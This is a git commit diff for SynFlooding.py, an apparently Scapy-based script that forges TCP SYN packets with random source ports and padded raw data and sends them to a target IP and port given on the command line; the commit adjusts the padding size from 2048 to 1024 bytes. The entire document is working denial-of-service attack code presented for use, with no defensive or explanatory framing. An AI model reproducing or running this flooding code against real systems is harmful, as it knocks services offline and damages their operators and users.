676f4a81b8fb23c3e9fcbc0182c9d1ab34fd8cc0
Cipher <cipher@ciphers-mini.home>
2023-07-03 15:31:01 +0100

    Fixed problem with synflooding

--- SynFlooding.py
+++ SynFlooding.py
@@ -11,21 +11,21 @@ target_ip = sys.argv[1]
 def Attack(target_port):
         # forge IP packet with target IP as the destination IP address
         ip = IP(dst=target_ip)
-    
+
         # forge a TCP SYN packet with a random source port
         # and the target port as the destination port
         tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
-    
-        # add some flooding data (1KB in this case, don't increase it too much, 
+
+        # add some flooding data (1KB in this case, don't increase it too much,
         # otherwise, it won't work.)
-        raw = Raw(b"X"*2048)
-    
+        raw = Raw(b"X"*1024)
+
         # stack up the layers
         p = ip / tcp / raw
-    
+
         # send the constructed packet
         send(p, verbose=0)
-    
+
         # Print the port number after sending the packet
         print(f"Packet sent to port {target_port}")
 
